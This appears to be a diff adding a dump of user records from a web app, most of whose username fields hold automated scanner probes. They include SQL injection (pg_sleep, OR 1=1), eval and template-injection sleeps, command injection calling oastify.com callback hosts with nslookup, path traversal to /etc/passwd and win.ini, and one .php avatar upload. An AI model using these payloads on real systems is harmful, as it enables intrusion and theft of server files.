+{"id":211,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb||pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 212
+{"id":212,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'||pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 213
+{"id":213,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb AND pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 214
+{"id":214,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' AND pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 215
+{"id":215,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,''||pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 216
+{"id":216,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb',''||pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 217
+{"id":217,"fullName":"hehe hehe","username":"zzz","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 218
+{"id":218,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb)AND pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 219
+{"id":219,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb')AND pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 220
+{"id":220,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,0)AND pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 221
+{"id":221,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb',0)AND pg_sleep(20)--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 222
+{"id":222,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb51083202' or '2764'='2764","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 223
+{"id":223,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb98096714' or '2182'='2184","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 224
+{"id":224,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb28013462' or '8566'='8566","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 225
+{"id":225,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb53722894' or '9732'='9732'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 226
+{"id":226,"fullName":"hcmute hcmute","username":"hcmute111","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 227
+{"id":227,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb89936702' or 5084=5084-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 228
+{"id":228,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb26070403' or 2359=2365-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 229
+{"id":229,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb77968540' or 8441=8441-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 230
+{"id":230,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb18672961' or 2976=2976'-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 231
+{"id":231,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and '4346'='4346","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 232
+{"id":232,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and '9761'='9762","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 233
+{"id":233,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and '8348'='8348","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 234
+{"id":234,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and '4152'='4152'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 235
+{"id":235,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and 8299=8299-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 236
+{"id":236,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and 1069=1075-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 237
+{"id":237,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and 7230=7230-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 238
+{"id":238,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and 5168=5168'-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 239
+{"id":239,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb\"","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 240
+{"id":240,"fullName":"Le Minh","username":"hehehehe","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 241
+{"id":241,"fullName":"AbNXJQQb AbNXJQQb","username":"lcjmoovn4s","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 242
+{"id":242,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb1ue73o9s8f","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 243
+{"id":243,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb}}yqm1z'/\"<stegi","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 244
+{"id":244,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb%}m4ina'/\"<qleyt","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 245
+{"id":245,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQbdbkzw%>o1s7p'/\"<f0mfr","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 246
+{"id":246,"fullName":"Admin Admin","username":"admin69420","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751782261.php","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 247
+{"id":247,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'+sleep(20.to_i)+'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 248
+{"id":248,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'+eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))+'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 249
+{"id":249,"fullName":"AbNXJQQb AbNXJQQb","username":"eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 250
+{"id":250,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'.sleep(20).'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 251
+{"id":251,"fullName":"Lia Yan","username":"guest","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 252
+{"id":252,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb{${sleep(20)}}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 253
+{"id":253,"fullName":"AbNXJQQb AbNXJQQb","username":"fl407pw9pcathyiussuk50gpvg19pcd41womcb.oastify.com","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 254
+{"id":254,"fullName":"AbNXJQQb AbNXJQQb","username":"http://jre4dt2dvggxn2oyyw0ob4mt1k7dvgj67yuoid.oastify.com/?AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 255
+{"id":255,"fullName":"AbNXJQQb AbNXJQQb","username":"nslookup -q=cname u0vfm4bo4rp8wdx9779zkfv4avgo4rskv8nvdj2.oastify.com.&","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 256
+{"id":256,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb|nslookup -q=cname av9vhk64z7kortsp2n4ffvqk5bb4z7n3bvylma.oastify.com.&","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 257
+{"id":257,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'\"`0&nslookup -q=cname t4yeq3fn8qt70c18b6dyoez3eukn8qwnkf75vu.oastify.com.&`'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 258
+{"id":258,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb&nslookup -q=cname ni984xthmk71e6f2p0rs28dxsoyhmkafy7lx9m.oastify.com.&'\\\"`0&nslookup -q=cname ni984xthmk71e6f2p0rs28dxsoyhmkafy7lx9m.oastify.com.&`'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 259
+{"id":259,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb|echo u05sp5z2ge 9rr6pklkxe||a #' |echo u05sp5z2ge 9rr6pklkxe||a #|\" |echo u05sp5z2ge 9rr6pklkxe||a #","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 260
+{"id":260,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb&echo y3gqph8qnm 74g6wo1dge&","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 261
+{"id":261,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb\"|echo 4cb254t41z m81bmyg390 ||","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 262
+{"id":262,"fullName":"tam do","username":"tamdo","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 263
+{"id":263,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'|echo 4v8717ip6p vd9xs2xhzp #xzwx","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 264
+{"id":264,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 265
+{"id":265,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb|ping -c 21 127.0.0.1||x","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 266
+{"id":266,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb&ping -n 21 127.0.0.1&","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 267
+{"id":267,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'|ping -c 21 127.0.0.1 #","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 268
+{"id":268,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb\"|ping -n 21 127.0.0.1 ||","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 269
+{"id":269,"fullName":"AbNXJQQb AbNXJQQb","username":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 270
+{"id":270,"fullName":"AbNXJQQb AbNXJQQb","username":"c:\\windows\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 271
+{"id":271,"fullName":"AbNXJQQb AbNXJQQb","username":"../../../../../../../../../../../../../../../../windows/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 272
+{"id":272,"fullName":"AbNXJQQb AbNXJQQb","username":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 273
+{"id":273,"fullName":"AbNXJQQb AbNXJQQb","username":"../../../../../../../../../../../../../../../../winnt/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 274
+{"id":274,"fullName":"AbNXJQQb AbNXJQQb","username":"\\windows\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 275
+{"id":275,"fullName":"AbNXJQQb AbNXJQQb","username":"file:///c:/windows/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 276
+{"id":276,"fullName":"AbNXJQQb AbNXJQQb","username":"...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 277
+{"id":277,"fullName":"AbNXJQQb AbNXJQQb","username":".../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 278
+{"id":278,"fullName":"AbNXJQQb AbNXJQQb","username":"...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 279
+{"id":279,"fullName":"AbNXJQQb AbNXJQQb","username":"À®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀwindowsÀwin.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 280
+{"id":280,"fullName":"AbNXJQQb AbNXJQQb","username":"%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 281
+{"id":281,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 282
+{"id":282,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb../../../../../../../../../../../../../../../../windows/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 283
+{"id":283,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 284
+{"id":284,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb../../../../../../../../../../../../../../../../winnt/win.ini","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 285
+{"id":285,"fullName":"AbNXJQQb AbNXJQQb","username":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\u0000AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 286
+{"id":286,"fullName":"AbNXJQQb AbNXJQQb","username":"c:\\windows\\win.ini\u0000AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 287
+{"id":287,"fullName":"AbNXJQQb AbNXJQQb","username":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini\u0000AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 288
+{"id":288,"fullName":"AbNXJQQb AbNXJQQb","username":"../../../../../../../../../../../../../../../../etc/passwd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 289
+{"id":289,"fullName":"raccoon raccoon","username":"raccoon","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751728158.png","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 290
+{"id":290,"fullName":"AbNXJQQb AbNXJQQb","username":"/etc/passwd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 291
+{"id":291,"fullName":"AbNXJQQb AbNXJQQb","username":"file:///etc/passwd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 292
+{"id":292,"fullName":"AbNXJQQb AbNXJQQb","username":"..././..././..././..././..././..././..././..././..././..././etc/passwd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 293
+{"id":293,"fullName":"AbNXJQQb AbNXJQQb","username":"À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯etcÀ¯passwd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 294
+{"id":294,"fullName":"AbNXJQQb AbNXJQQb","username":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 295
+{"id":295,"fullName":"' OR '1'='1'-- ' OR '1'='1'--","username":"' OR '1'='1'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 296
+{"id":296,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb../../../../../../../../../../../../../../../../etc/passwd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 297
+{"id":297,"fullName":"AbNXJQQb AbNXJQQb","username":"../../../../../../../../../../../../../../../../etc/passwd\u0000AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 298
+{"id":298,"fullName":"AbNXJQQb AbNXJQQb","username":".../AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 299
